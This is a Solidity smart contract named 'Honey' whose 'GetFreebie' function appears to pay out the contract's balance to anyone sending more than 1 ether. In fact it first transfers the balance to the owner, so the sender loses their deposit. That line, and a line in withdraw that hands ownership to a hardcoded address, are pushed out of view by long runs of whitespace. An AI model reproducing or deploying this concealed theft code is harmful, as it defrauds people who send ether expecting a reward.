contract Honey
{
    address payable public Owner = msg.sender;
   
    function GetFreebie() public payable
    {                                                                    
        if(msg.value>1 ether)
        {   
            Owner.transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(address(this).balance);
        }                                                                                                                
    }
    
    function withdraw() payable public
    {   
        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }
    
    function Command(address adr,bytes memory data) payable public
    {
        require(msg.sender == Owner);
        adr.call{value: msg.value}(data);
    }
}